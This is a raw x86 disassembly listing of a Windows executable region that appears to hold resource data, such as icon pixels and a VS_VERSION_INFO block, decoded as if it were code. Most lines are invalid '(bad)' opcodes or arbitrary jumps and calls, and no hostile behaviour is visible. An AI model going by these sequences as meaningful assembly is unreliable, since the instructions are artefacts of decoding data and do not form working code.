  4158df:	(bad)  
  4158e0:	jmp    esp
  4158e2:	(bad)  
  4158e4:	jmp    ebx
  4158e6:	aad    0xff
  4158e8:	dec    edx
  4158ea:	mov    bl,0xff
  4158ec:	fcmovu st,st(6)
  4158ee:	fdivp  st(7),st
  4158f0:	fwait
  4158f1:	popf   
  4158f2:	mov    al,ds:0x909293ff
  4158f7:	and    DWORD PTR [eax],eax
  4158f9:	add    BYTE PTR [eax],al
  4158fb:	add    BYTE PTR [ecx-0x4ef66667],bl
  415901:	mov    ah,0xb2
  415903:	push   ecx
  415904:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415905:	test   al,0xa9
  415907:	mov    eax,0xffb7b7b6
  41590c:	fcomp  st(0)
  41590e:	fdivr  st,st(7)
  415910:	cld    
  415911:	cld    
  415912:	cld    
  415913:	(bad)  
  415914:	(bad)  
  415915:	(bad)  
  415916:	(bad)  
  415917:	call   eax
  415919:	fsubrp st(3),st
  41591b:	call   FWORD PTR [ebx+ebx*2+0x8cff53]
  415922:	add    bh,bh
  415924:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415925:	adc    BYTE PTR [eax],al
  415927:	push   DWORD PTR [edx-0x4000ffe9]
  41592d:	sbb    eax,DWORD PTR [eax]
  41592f:	dec    ebx
  415931:	push   ds
  415932:	add    bh,bh
  415934:	xlat   BYTE PTR ds:[ebx]
  415935:	and    al,0x0
  415937:	jmp    ebx
  415939:	and    BYTE PTR [eax],al
  41593b:	push   eax
  41593d:	push   cs
  41593e:	add    bh,bh
  415940:	push   DWORD PTR [eax-0x7000063]
  415946:	idiv   bh
  415948:	(bad)  
  415949:	(bad)  
  41594b:	push   eax
  41594d:	xlat   BYTE PTR ds:[ebx]
  41594e:	iret   
  41594f:	push   DWORD PTR [ebx-0x42005554]
  415955:	mov    ebp,0xa3adffbd
  41595a:	lahf   
  41595b:	(bad)  
  41595c:	stc    
  41595d:	out    0xe2,eax
  41595f:	(bad)  
  415960:	push   edx
  415962:	in     al,dx
  415963:	(bad)  
  415964:	push   ebx
  415966:	out    dx,al
  415967:	(bad)  
  415968:	(bad)  
  415969:	fadd   st,st(6)
  41596b:	(bad)  
  41596c:	jmp    0xa7413e56
  415971:	lods   al,BYTE PTR ds:[esi]
  415972:	scas   al,BYTE PTR es:[edi]
  415973:	call   DWORD PTR [eax+0x2c8f90]
	...
  415981:	add    BYTE PTR [eax],al
  415983:	add    BYTE PTR [esi+eiz*4-0x5f60fa5a],ah
  41598a:	mov    al,ds:0x91919017
  41598f:	bound  ebx,QWORD PTR [ecx-0x4c476566]
  415995:	mov    ah,0xb4
  415997:	repz ret 
  415999:	iret   
  41599a:	sar    bh,cl
  41599c:	sahf   
  41599d:	jb     0x415a0c
  41599f:	dec    DWORD PTR [ebp-0x57010000]
  4159a5:	adc    eax,DWORD PTR [eax]
  4159a7:	push   DWORD PTR [ebp-0x3e00ffe4]
  4159ad:	push   ds
  4159ae:	add    bh,bh
  4159b0:	iret   
  4159b1:	and    BYTE PTR [eax],al
  4159b3:	(bad)  
  4159b4:	(bad)  [esi]
  4159b6:	add    bh,bh
  4159b8:	out    0x18,al
  4159ba:	add    bh,bh
  4159bc:	clc    
  4159bd:	and    al,0x0
  4159bf:	(bad)  
  4159c0:	jmp    edx
  4159c2:	xlat   BYTE PTR ds:[ebx]
  4159c3:	(bad)  
  4159c4:	(bad)  
  4159c5:	(bad)  
  4159c6:	(bad)  
  4159c7:	(bad)  
  4159c8:	(bad)  
  4159c9:	in     eax,dx
  4159ca:	jmp    0xec3259ce
  4159cf:	(bad)  
  4159d0:	out    dx,al
  4159d1:	loop   0x4159ad
  4159d3:	(bad)  
  4159d4:	jmp    0xed4130b7
  4159d9:	fcmovnbe st,st(2)
  4159db:	(bad)  
  4159dc:	std    
  4159dd:	out    0xdb,al
  4159df:	(bad)  
  4159e0:	jmp    ebp
  4159e2:	aad    0xff
  4159e4:	(bad)  
  4159e5:	fmul   st(1),st
  4159e7:	(bad)  
  4159e8:	sti    
  4159e9:	mov    ebx,0xe9f3ff9e
  4159ee:	in     al,0xff
  4159f0:	mov    cl,0xba
  4159f2:	mov    esp,0x8a8b8dff
  4159f7:	push   eax
	...
  415a14:	xchg   esi,eax
  415a15:	xchg   esi,eax
  415a16:	xchg   esi,eax
  415a17:	or     al,0xae
  415a19:	mov    dh,0xb9
  415a1b:	lods   al,BYTE PTR ds:[esi]
  415a1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a1d:	popf   
  415a1e:	pushf  
  415a1f:	call   DWORD PTR [ecx-0x5200fdfb]
  415a25:	or     BYTE PTR [eax],al
  415a27:	(bad)  
  415a28:	mov    edx,0xc6ff000d
  415a2d:	or     al,BYTE PTR [eax]
  415a2f:	call   esp
  415a31:	or     al,BYTE PTR [eax]
  415a33:	jmp    ebx
  415a35:	or     BYTE PTR [eax],al
  415a37:	(bad)  
  415a38:	out    dx,eax
  415a39:	add    BYTE PTR [eax],al
  415a3b:	(bad)  
  415a3c:	jmp    FWORD PTR [ebx]
  415a3e:	add    bh,bh
  415a40:	(bad)  
  415a41:	fcmovnbe st,st(0)
  415a43:	(bad)  
  415a44:	std    
  415a45:	fxch   st(7)
  415a47:	(bad)  
  415a48:	inc    esi
  415a4a:	mov    ch,0xff
  415a4c:	cli    
  415a4d:	les    esi,FWORD PTR [ecx-0x4f3d0b01]
  415a53:	(bad)  
  415a54:	clc    
  415a55:	shr    DWORD PTR [edi-0x5b440b01],0xff
  415a5c:	out    0xb4,al
  415a5e:	mov    eax,ds:0xacbae0ff
  415a63:	jmp    ebx
  415a65:	lds    edi,FWORD PTR [ecx-0x3b331c01]
  415a6b:	push   ebp
  415a6d:	div    ch
  415a6f:	inc    esp
  415a71:	(bad)  
  415a72:	leave  
  415a73:	call   FWORD PTR [ebp+0x3b9b9c]
	...
  415a95:	add    BYTE PTR [eax],al
  415a97:	add    BYTE PTR [edx-0x4e924348],dh
  415a9d:	mov    edx,0x85ffbd
  415aa2:	add    bh,bh
  415aa4:	mov    eax,ds:0xb3ff0000
  415aa9:	or     BYTE PTR [ebx],al
  415aab:	(bad)  
  415aac:	mov    eax,0xbfff0b16
  415ab1:	sub    al,0x1a
  415ab3:	dec    esp
  415ab5:	dec    eax
  415ab6:	xor    edi,edi
  415ab8:	(bad)  
  415ab9:	push   edi
  415aba:	inc    ebp
  415abb:	call   ecx
  415abd:	jl     0x415b2a
  415abf:	call   ebp
  415ac1:	scas   al,BYTE PTR es:[edi]
  415ac2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ac3:	call   ecx
  415ac5:	mov    dl,0xac
  415ac7:	call   eax
  415ac9:	mov    ch,0xaf
  415acb:	dec    eax
  415acd:	mov    ebp,0xcac7ffbc
  415ad2:	retf   0xcbff
  415ad5:	rcl    dl,1
  415ad7:	dec    edx
  415ad9:	rcl    esp,1
  415adb:	dec    ecx
  415add:	(bad)  
  415ade:	fucompp 
  415ae0:	retf   
  415ae1:	fchs   
  415ae3:	int    0xc7
  415ae5:	xlat   BYTE PTR ds:[ebx]
  415ae6:	fsub   QWORD PTR [edx-0x70242937]
  415aec:	iret   
  415aed:	rcl    ebx,1
  415aef:	mov    ecx,edx
  415af1:	aam    0xd4
  415af3:	push   ecx
	...
  415b18:	mov    bl,0xb5
  415b1a:	mov    ecx,0xc4bfb664
  415b1f:	call   FWORD PTR [edi-0x5200908d]
  415b25:	xchg   ecx,eax
  415b26:	(bad)  
  415b27:	(bad)  
  415b28:	mov    edx,0xb8ffabad
  415b2d:	mov    ebx,0xceb8ffb8
  415b32:	iret   
  415b33:	(bad)  
  415b34:	mov    esp,0xc1ffe5e0
  415b39:	in     eax,dx
  415b3a:	repz test eax,0xc4dfefe7
  415b41:	xlat   BYTE PTR ds:[ebx]
  415b42:	fidivr DWORD PTR [edi-0x5f252a3c]
  415b48:	(bad)
  415b4b:	test   eax,ecx
  415b4d:	rcl    ebp,1
  415b4f:	jae    0x415b19
  415b51:	int    0xce
  415b53:	push   esp
  415b54:	(bad)  
  415b55:	retf   
  415b56:	int3   
  415b57:	aas    
  415b58:	(bad)  
  415b59:	int3   
  415b5a:	int    0x39
  415b5c:	enter  0xcdca,0x25
  415b60:	(bad)  
  415b61:	leave  
  415b62:	enter  0xc61d,0xc8
  415b66:	leave  
  415b67:	shufps xmm1,xmm0,0xc9
  415b6b:	or     eax,0x4c9c8c3
  415b70:	(bad)  
  415b71:	leave  
  415b72:	retf   
  415b73:	push   es
  415b74:	retf   
  415b75:	iret   
  415b76:	rol    BYTE PTR [edx],cl
	...
  415b98:	call   0xbdbc:0xba0c9c99
  415b9f:	mov    ds:0xbee8e6ce,eax
  415ba4:	enter  0xe3e1,0x96
  415ba8:	leave  
  415ba9:	fstp   st(7)
  415bab:	imul   ecx,edx,0xffffffdd
  415bae:	loope  0x415bff
  415bb0:	retf   
  415bb1:	xlat   BYTE PTR ds:[ebx]
  415bb2:	fidivr DWORD PTR [eax]
  415bb4:	retf   0xd2d1
  415bb7:	cs enter 0xcccd,0x1e
  415bbc:	enter  0xcac9,0xe
	...
  415cf8:	(bad)  
  415cf9:	(bad)  
  415cfa:	(bad)  
  415cfb:	(bad)  
  415cfc:	(bad)  
  415cfd:	(bad)  
  415cfe:	(bad)  
  415cff:	(bad)  
  415d00:	(bad)  
  415d01:	inc    BYTE PTR [eax]
  415d03:	(bad)  
  415d04:	(bad)  
  415d05:	cld    
  415d06:	add    BYTE PTR [ebx-0x1],dh
  415d09:	lock add BYTE PTR [ecx],al
  415d0c:	push   eax
  415d0e:	add    BYTE PTR [eax],al
  415d10:	jmp    eax
  415d12:	add    BYTE PTR [eax],al
  415d14:	push   eax
  415d16:	add    BYTE PTR [eax],al
  415d18:	cmp    BYTE PTR [eax],0x0
  415d1b:	add    al,BYTE PTR [eax-0x7ffcfff4]
  415d21:	add    al,BYTE PTR [eax]
  415d23:	add    eax,DWORD PTR [eax-0x7ffd0000]
  415d29:	add    BYTE PTR [eax],al
  415d2b:	add    eax,DWORD PTR [eax-0x7ffd0000]
  415d31:	add    BYTE PTR [eax],al
  415d33:	add    DWORD PTR [eax-0x7fff0000],eax
  415d39:	add    BYTE PTR [eax],al
  415d3b:	add    DWORD PTR [eax-0x7fff0000],eax
  415d41:	add    BYTE PTR [eax],al
  415d43:	add    DWORD PTR [eax-0x7fff0000],eax
  415d49:	add    BYTE PTR [eax],al
  415d4b:	add    DWORD PTR [eax-0x80000000],eax
  415d51:	add    BYTE PTR [eax],al
  415d53:	add    BYTE PTR [eax-0x80000000],al
  415d59:	add    BYTE PTR [eax],al
  415d5b:	add    al,ah
  415d5d:	add    BYTE PTR [eax],al
  415d5f:	add    dh,bh
  415d61:	add    BYTE PTR [eax],al
  415d63:	add    bh,bh
  415d65:	add    BYTE PTR [eax],al
  415d67:	add    edi,edi
  415d69:	add    BYTE PTR [eax],al
  415d6b:	add    bh,bh
  415d6d:	add    BYTE PTR [edi],bh
  415d6f:	(bad)  
  415d70:	(bad)  
  415d71:	(bad)  
  415d72:	(bad)  
  415d73:	(bad)  
  415d74:	(bad)  
  415d75:	(bad)  
  415d76:	(bad)  
  415d77:	jmp    FWORD PTR [eax]
  415d79:	add    BYTE PTR [eax],al
  415d7b:	add    BYTE PTR [eax],dl
  415d7d:	add    BYTE PTR [eax],al
  415d7f:	add    BYTE PTR [eax],ah
  415d81:	add    BYTE PTR [eax],al
  415d83:	add    BYTE PTR [ecx],al
  415d85:	add    BYTE PTR [eax],ah
  415d87:	add    BYTE PTR [eax],al
  415d89:	add    BYTE PTR [eax],al
  415d8b:	add    BYTE PTR [eax+0x4],al
	...
  415dde:	add    BYTE PTR [eax],al
  415de0:	xchg   ecx,eax
  415de1:	nop
  415de2:	nop
  415de3:	(bad)  
  415de4:	jnp    0x415e5f
  415de6:	jns    0x415de7
  415de8:	xchg   ecx,eax
  415de9:	nop
  415dea:	nop
  415deb:	inc    DWORD PTR [eax]
	...
  415df5:	add    BYTE PTR [eax],al
  415df7:	add    BYTE PTR [ebx-0x44004344],bh
  415dfd:	mov    esp,0xb5b4ffbc
  415e02:	mov    ch,0xff
  415e04:	fwait
  415e05:	pushf  
  415e06:	pushf  
  415e07:	call   FWORD PTR [ebx-0x60006364]
  415e0d:	mov    al,ds:0xa0a0ffa0
  415e12:	mov    al,ds:0xff
	...
  415e1f:	add    BYTE PTR [esp+esi*4-0x6b6b2c4c],dh
  415e26:	xchg   esp,eax
  415e27:	call   FWORD PTR [esi+0xcd9e9e]
	...
  415e35:	add    BYTE PTR [eax],al
  415e37:	add    dl,dl
  415e39:	rcl    dl,cl
  415e3b:	or     al,0xc9
  415e3e:	leave  
  415e3f:	inc    esp
  415e41:	mov    dh,0xff
  415e44:	mov    ecx,0xaaffbaba
  415e49:	stos   DWORD PTR es:[edi],eax
  415e4a:	stos   DWORD PTR es:[edi],eax
  415e4b:	jmp    DWORD PTR [eax-0x5f005f60]
  415e51:	mov    al,ds:0x61a0
	...
  415e5e:	add    BYTE PTR [eax],al
  415e60:	stos   DWORD PTR es:[edi],eax
  415e61:	stos   DWORD PTR es:[edi],eax
  415e62:	stos   DWORD PTR es:[edi],eax
  415e63:	idiv   DWORD PTR [edi-0x5a004041]
  415e69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e6b:	inc    DWORD PTR [eax]
	...
  415e79:	add    BYTE PTR [eax],al
  415e7b:	add    dh,bl
  415e7d:	(bad)  
  415e7f:	ss mov ecx,0x8affbaba
  415e85:	mov    cl,BYTE PTR [edx-0x68686801]
  415e8b:	in     al,dx
  415e8c:	mov    al,ds:0x36a0a0
	...
  415e9d:	add    BYTE PTR [eax],al
  415e9f:	add    BYTE PTR [esi-0x2e085152],ch
  415ea5:	rcl    ecx,1
  415ea7:	jmp    FWORD PTR [ebx-0x3c005455]
  415ead:	(bad)  
  415eae:	les    eax,FWORD PTR [esi-0x3e3e40]
  415eb4:	mov    esi,0xbbffbfbf
  415eb9:	mov    esp,0xb9b8ffbc
  415ebe:	mov    ecx,0xb6b6b5ff
  415ec3:	jmp    FWORD PTR [edx-0x57005556]
  415ec9:	test   al,0xa8
  415ecb:	jmp    DWORD PTR [esi-0x5b00595a]
  415ed1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ed2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ed3:	jmp    DWORD PTR [edx-0x5f005d5e]
  415ed9:	mov    al,ds:0xa0a0ffa0
  415ede:	mov    al,ds:0xadadad95
  415ee3:	not    ecx
  415ee5:	rcl    ecx,1
  415ee7:	jmp    FWORD PTR [ebx-0x32005455]
  415eed:	iret   
  415eee:	iret   
  415eef:	dec    ebp
  415ef1:	iret   
  415ef2:	iret   
  415ef3:	dec    ebp
  415ef5:	into   
  415ef6:	iret   
  415ef7:	dec    esp
  415ef9:	into   
  415efa:	into   
  415efb:	dec    ebx
  415efd:	int    0xcd
  415eff:	dec    edx
  415f01:	int3   
  415f02:	int3   
  415f03:	inc    edi
  415f05:	leave  
  415f06:	leave  
  415f07:	inc    esi
  415f09:	leave  
  415f0a:	leave  
  415f0b:	inc    esi
  415f0d:	leave  
  415f0e:	leave  
  415f0f:	inc    ebp
  415f11:	enter  0xffc8,0xc5
  415f15:	enter  0xffc8,0xc4
  415f19:	mov    edi,0xa0a0a0ff
  415f1f:	jmp    FWORD PTR [ebp-0x2e085253]
  415f25:	rcl    ecx,1
  415f27:	jmp    FWORD PTR [ebx-0x31005455]
  415f2d:	rcl    al,1
  415f2f:	jmp    FWORD PTR [ebp-0x58005152]
  415f35:	(bad)  
  415f36:	ud0    ebp,DWORD PTR [ebx-0x5700f2ed]
  415f3d:	push   cs
  415f3e:	push   cs
  415f3f:	jmp    FWORD PTR [ecx-0x4b00dfe0]
  415f45:	aas    
  415f46:	das    
  415f47:	call   esp
  415f49:	sbb    eax,DWORD PTR [ecx]
  415f4b:	call   esp
  415f4d:	sbb    eax,0x1dd8ff01
  415f52:	add    bh,bh
  415f54:	retf   
  415f55:	and    eax,0xc8c5ff03
  415f5a:	enter  0xa1ff,0xa1
  415f5e:	mov    eax,ds:0xaeaeaeff
  415f63:	not    ecx
  415f65:	rcl    ecx,1
  415f67:	jmp    FWORD PTR [esp+ebp*4-0x2e300054]
  415f6e:	sar    edi,1
  415f70:	stos   DWORD PTR es:[edi],eax
  415f71:	lods   al,BYTE PTR ds:[esi]
  415f72:	lods   al,BYTE PTR ds:[esi]
  415f73:	push   DWORD PTR [edx-0x4c00dcd4]
  415f79:	xor    DWORD PTR [edx],esp
  415f7b:	(bad)  
  415f7c:	mov    ecx,0xc9ff0c1d
  415f81:	(bad)
  415f84:	int3   
  415f85:	jno    0x415fea
  415f87:	call   edi
  415f89:	inc    edi
  415f8a:	sub    al,0xff
  415f8c:	fiadd  WORD PTR [eax+0x25]
  415f8f:	jmp    ebx
  415f91:	inc    esp
  415f92:	daa    
  415f93:	(bad)  
  415f94:	fnstsw WORD PTR [ebx]
  415f96:	adc    bh,bh
  415f98:	(bad)  
  415f99:	mov    edi,0xa3a3a3ff
  415f9f:	call   DWORD PTR [esi+0xf7a3bd]
  415fa5:	repnz dec eax
  415fa7:	jmp    DWORD PTR [edx-0x3e]
  415faa:	cmp    bh,0xcf
  415fad:	rcl    ecx,1
  415faf:	jmp    FWORD PTR [ecx-0x4b005657]
  415fb5:	inc    eax
  415fb6:	xor    eax,0x222fb4ff
  415fbb:	call   edi
  415fbd:	(bad)  
  415fbe:	aad    0xff
  415fc0:	out    dx,al
  415fc1:	out    dx,al
  415fc2:	out    dx,al
  415fc3:	(bad)  
  415fc4:	clc    
  415fc5:	clc    
  415fc6:	clc    
  415fc7:	push   DWORD PTR [ebx-0x24007873]
  415fcd:	pop    eax
  415fce:	cmp    edi,edi
  415fd0:	fstp   QWORD PTR [ecx+eax*2-0x1]
  415fd4:	fimul  WORD PTR [edi+0x2d]
  415fd7:	inc    ebp
  415fd9:	enter  0xffc8,0xa5
  415fdd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415fde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415fdf:	jmp    FWORD PTR [ebx+0x48f7abab]
  415fe5:	inc    esp
  415fe6:	inc    ebx
  415fe7:	(bad)  
  415fe8:	jnp    0x416063
  415fea:	jns    0x415feb
  415fec:	rcl    edx,1
  415fee:	sar    bh,cl
  415ff0:	mov    ds:0xb8ffa3a3,eax
  415ff5:	inc    ebx
  415ff6:	cmp    bh,bh
  415ff8:	rol    BYTE PTR [ecx+0x34],0xff
  415ffc:	fmul   st(2),st
  415ffe:	leave  
  415fff:	(bad)  
  416000:	fcomp  DWORD PTR [edx]
  416002:	add    bh,bh
  416004:	aam    0x82
  416006:	jne    0x416007
  416008:	(bad)  
  416009:	(bad)  
  41600a:	(bad)  
  41600b:	call   esi
  41600d:	push   0x53
  41600f:	call   ebp
  416011:	ins    BYTE PTR es:[edi],dx
  416012:	pop    ecx
  416013:	(bad)  
  416014:	fisub  DWORD PTR [edx+0x48]
  416017:	inc    edi
  416019:	retf   0xffca
  41601c:	stos   DWORD PTR es:[edi],eax
  41601d:	stos   DWORD PTR es:[edi],eax
  41601e:	stos   DWORD PTR es:[edi],eax
  41601f:	(bad)  
  416020:	mov    esi,0xbe94bebe
  416025:	mov    esi,0xbebeffbe
  41602a:	mov    esi,0xd2d2d0c0
  41602f:	jmp    DWORD PTR [edx-0x43005d5e]
  416035:	das    
  416036:	and    al,0xff
  416038:	lds    ebx,FWORD PTR [ecx+ecx*1]
  41603b:	(bad)  
  41603c:	ficomp DWORD PTR [esi]
  41603e:	add    bh,bh
  416040:	out    0x1b,al
  416042:	add    bh,bh
  416044:	call   FWORD PTR [ecx+0x36]
  416047:	push   ebx
  416049:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41604a:	nop
  41604b:	(bad)  
  41604c:	(bad)  
  41604e:	fcos   
  416050:	jmp    FWORD PTR [edx+0x3c]
  416053:	(bad)  
  416054:	jmp    DWORD PTR [ebp+0x31]
  416057:	inc    edi
  416059:	retf   0xffca
  41605c:	lods   eax,DWORD PTR ds:[esi]
  41605d:	scas   al,BYTE PTR es:[edi]
  41605e:	scas   al,BYTE PTR es:[edi]
  41605f:	inc    DWORD PTR [eax]
	...
  416069:	add    BYTE PTR [eax],al
  41606b:	add    cl,dl
  41606d:	rcl    bl,cl
  41606f:	jmp    DWORD PTR [eax-0x3a005f60]
  416075:	sbb    BYTE PTR [edi],al
  416077:	call   esp
  416079:	sbb    BYTE PTR [ecx],al
  41607b:	jmp    ebx
  41607d:	es add bh,bh
  416080:	in     eax,dx
  416081:	sbb    al,BYTE PTR [eax]
  416083:	(bad)  
  416084:	push   DWORD PTR [eax+0x4b]
  416087:	(bad)  
  416088:	jmp    FWORD PTR [ebx+0x48]
  41608b:	jmp    ecx
  41608d:	loope  0x416070
  41608f:	inc    eax
  416091:	mov    edx,0x6bffffb8
  416096:	aas    
  416097:	dec    eax
  416099:	retf   0xffcb
  41609c:	mov    al,0xb1
  41609e:	mov    cl,0xff
	...
  4160ac:	rcl    edx,1
  4160ae:	sar    edi,cl
  4160b0:	mov    al,ds:0xcaffa0a0
  4160b5:	add    al,0x4
  4160b7:	(bad)  
  4160b8:	fmul   QWORD PTR [edi]
  4160ba:	add    bh,bh
  4160bc:	call   0xf84060d3
  4160c1:	push   ss
  4160c2:	add    bh,bh
  4160c4:	(bad)  
  4160c5:	jg     0x416103
  4160c7:	call   esi
  4160c9:	sbb    BYTE PTR [edi+edi*8-0x29],0x83
  4160ce:	pop    ecx
  4160cf:	(bad)  
  4160d0:	fiadd  DWORD PTR [ecx+0x73dfff51]
  4160d6:	inc    ebx
  4160d7:	dec    ecx
  4160d9:	retf   
  4160da:	retf   
  4160db:	push   DWORD PTR [edx+0xffb3b3]
	...
  4160e9:	add    BYTE PTR [eax],al
  4160eb:	add    cl,dl
  4160ed:	rcl    bl,cl
  4160ef:	jmp    DWORD PTR [eax-0x5f005f60]
  4160f5:	mov    al,ds:0xa0a0ffa0
  4160fa:	mov    al,ds:0xa2a2a2ff
  4160ff:	jmp    DWORD PTR [esp+eiz*4-0x5152005c]
  416106:	scas   al,BYTE PTR es:[edi]
  416107:	push   DWORD PTR [eax-0x4d004f50]
  41610d:	mov    bl,0xb3
  41610f:	push   DWORD PTR [ebp-0x4700494a]
  416115:	mov    ecx,0xcbc9ffb9
  41611a:	int3   
  41611b:	push   DWORD PTR [ebp+0xffb6b6]
	...
  416129:	add    BYTE PTR [eax],al
  41612b:	add    cl,dl
  41612d:	rcl    bl,cl
  41612f:	js     0x416102
  416131:	rcl    bl,cl
  416133:	call   ecx
  416135:	rcl    bl,cl
  416137:	call   ecx
  416139:	rcl    bl,cl
  41613b:	call   eax
  41613d:	rcl    dl,cl
  41613f:	call   eax
  416141:	rcl    edx,1
  416143:	dec    esi
  416145:	rcl    al,1
  416147:	dec    ebp
  416149:	iret   
  41614a:	iret   
  41614b:	dec    ebp
  41614d:	iret   
  41614e:	iret   
  41614f:	dec    esp
  416151:	into   
  416152:	into   
  416153:	dec    ebx
  416155:	int    0xcd
  416157:	dec    edx
  416159:	int3   
  41615a:	int3   
  41615b:	(bad)  
  41615c:	mov    eax,0x95b9b9
	...
  41619d:	add    BYTE PTR [eax],al
  41619f:	add    bh,bh
  4161a1:	inc    DWORD PTR [eax]
  4161a3:	add    BYTE PTR [edi+eax*1],bl
  4161a6:	add    BYTE PTR [eax],al
  4161a8:	sbb    al,0x7
  4161aa:	add    BYTE PTR [eax],al
  4161ac:	push   ds
  4161ad:	sldt   WORD PTR [eax]
	...
  4161cc:	loopne 0x4161ce
  4161ce:	add    BYTE PTR [eax],al
  4161d0:	loopne 0x4161d2
  4161d2:	add    BYTE PTR [eax],al
  4161d4:	loopne 0x4161d6
  4161d6:	add    BYTE PTR [eax],al
  4161d8:	loopne 0x4161da
  4161da:	add    BYTE PTR [eax],al
  4161dc:	(bad)  
  4161dd:	inc    DWORD PTR [eax]
  4161df:	add    BYTE PTR [eax],al
  4161e1:	add    BYTE PTR [ecx],al
  4161e3:	add    BYTE PTR [edx],cl
  4161e5:	add    BYTE PTR [eax],dh
  4161e7:	xor    BYTE PTR [eax],dl
  4161e9:	add    BYTE PTR [ecx],al
  4161eb:	add    BYTE PTR [eax+eax*1],al
  4161ee:	push   0x1000006
  4161f3:	add    BYTE PTR [eax],ah
  4161f5:	and    BYTE PTR [eax],dl
  4161f7:	add    BYTE PTR [ecx],al
  4161f9:	add    BYTE PTR [eax+eax*1],al
  4161fc:	call   0x2416203
  416201:	add    BYTE PTR [eax],dl
  416203:	adc    BYTE PTR [eax],dl
  416205:	add    BYTE PTR [ecx],al
  416207:	add    BYTE PTR [eax+eax*1],al
  41620a:	sub    BYTE PTR [ecx],al
  41620c:	add    BYTE PTR [eax],al
  41620e:	add    eax,DWORD PTR [eax]
  416210:	xor    BYTE PTR [eax],dh
  416212:	add    BYTE PTR [eax],al
  416214:	add    DWORD PTR [eax],eax
  416216:	or     BYTE PTR [eax],al
  416218:	test   al,0xe
  41621a:	add    BYTE PTR [eax],al
  41621c:	add    al,0x0
  41621e:	and    BYTE PTR [eax],ah
  416220:	add    BYTE PTR [eax],al
  416222:	add    DWORD PTR [eax],eax
  416224:	or     BYTE PTR [eax],al
  416226:	test   al,0x8
  416228:	add    BYTE PTR [eax],al
  41622a:	add    eax,0x101000
  41622f:	add    BYTE PTR [ecx],al
  416231:	add    BYTE PTR [eax],cl
  416233:	add    BYTE PTR [eax+0x5],ch
  416236:	add    BYTE PTR [eax],al
  416238:	push   es
  416239:	add    BYTE PTR [eax],al
  41623b:	add    BYTE PTR [eax],al
  41623d:	add    BYTE PTR [ecx],al
  41623f:	add    BYTE PTR [eax],ah
  416241:	add    al,ch
  416243:	mov    bh,0x0
  416245:	add    BYTE PTR [edi],al
  416247:	add    BYTE PTR [eax],dh
  416249:	xor    BYTE PTR [eax],al
  41624b:	add    BYTE PTR [ecx],al
  41624d:	add    BYTE PTR [eax],ah
  41624f:	add    BYTE PTR [eax+0x8000025],ch
  416255:	add    BYTE PTR [eax],ah
  416257:	and    BYTE PTR [eax],al
  416259:	add    BYTE PTR [ecx],al
  41625b:	add    BYTE PTR [eax],ah
  41625d:	add    BYTE PTR [eax+0x9000010],ch
  416263:	add    BYTE PTR [eax],dl
  416265:	adc    BYTE PTR [eax],al
  416267:	add    BYTE PTR [ecx],al
  416269:	add    BYTE PTR [eax],ah
  41626b:	add    BYTE PTR [eax+0x4],ch
  41626e:	add    BYTE PTR [eax],al
  416270:	or     al,BYTE PTR [eax]
  416272:	add    BYTE PTR [eax],al
  416274:	add    BYTE PTR [eax],al
  416276:	add    BYTE PTR [eax],al
  416278:	enter  0x3403,0x0
  41627c:	add    BYTE PTR [eax],al
  41627e:	push   esi
  41627f:	add    BYTE PTR [ebx+0x0],dl
  416282:	pop    edi
  416283:	add    BYTE PTR [esi+0x0],dl
  416286:	inc    ebp
  416287:	add    BYTE PTR [edx+0x0],dl
  41628a:	push   ebx
  41628b:	add    BYTE PTR [ecx+0x0],cl
  41628e:	dec    edi
  41628f:	add    BYTE PTR [esi+0x0],cl
  416292:	pop    edi
  416293:	add    BYTE PTR [ecx+0x0],cl
  416296:	dec    esi
  416297:	add    BYTE PTR [esi+0x0],al
  41629a:	dec    edi
  41629b:	add    BYTE PTR [eax],al
  41629d:	add    BYTE PTR [eax],al
  41629f:	add    BYTE PTR [ebp+0xfeef04],bh
  4162a5:	add    BYTE PTR [ecx],al
  4162a7:	add    BYTE PTR [eax],al
  4162a9:	add    BYTE PTR [edx],cl
  4162ab:	add    BYTE PTR [eax],al
  4162ad:	inc    eax
  4162ae:	add    BYTE PTR [eax],ch
  4162b0:	add    BYTE PTR [eax],al
  4162b2:	or     al,BYTE PTR [eax]
  4162b4:	add    BYTE PTR [eax+0x0],al
  4162b7:	sub    BYTE PTR [edi],bh
  4162b9:	add    BYTE PTR [eax],al
  4162bb:	add    BYTE PTR [eax],al
  4162bd:	add    BYTE PTR [eax],al
  4162bf:	add    BYTE PTR [eax+eax*1],al
  4162c2:	add    al,0x0
  4162c4:	add    DWORD PTR [eax],eax
	...
  4162d2:	add    BYTE PTR [eax],al
  4162d4:	add    eax,DWORD PTR es:[eax]
  4162d7:	add    BYTE PTR [ecx],al
  4162d9:	add    BYTE PTR [ebx+0x0],dl
  4162dc:	je     0x4162de
  4162de:	jb     0x4162e0
  4162e0:	imul   eax,DWORD PTR [eax],0x67006e
  4162e6:	inc    esi
  4162e7:	add    BYTE PTR [ecx+0x0],ch
  4162ea:	ins    BYTE PTR es:[edi],dx
  4162eb:	add    BYTE PTR [ebp+0x0],ah
  4162ee:	dec    ecx
  4162ef:	add    BYTE PTR [esi+0x0],ch
  4162f2:	data16 add BYTE PTR [edi+0x0],ch
  4162f6:	add    BYTE PTR [eax],al
  4162f8:	add    al,BYTE PTR [ebx]
  4162fa:	add    BYTE PTR [eax],al
  4162fc:	add    DWORD PTR [eax],eax
  4162fe:	xor    BYTE PTR [eax],al
  416300:	xor    al,0x0
  416302:	xor    BYTE PTR [eax],al
  416304:	cmp    DWORD PTR [eax],eax
  416306:	xor    BYTE PTR [eax],al
  416308:	xor    al,0x0
  41630a:	inc    edx
  41630b:	add    BYTE PTR [eax],dh
  41630d:	add    BYTE PTR [eax],al
  41630f:	add    BYTE PTR [eax+eax*1+0x16],cl
  416313:	add    BYTE PTR [ecx],al
  416315:	add    BYTE PTR [ebx+0x0],al
  416318:	outs   dx,DWORD PTR ds:[esi]
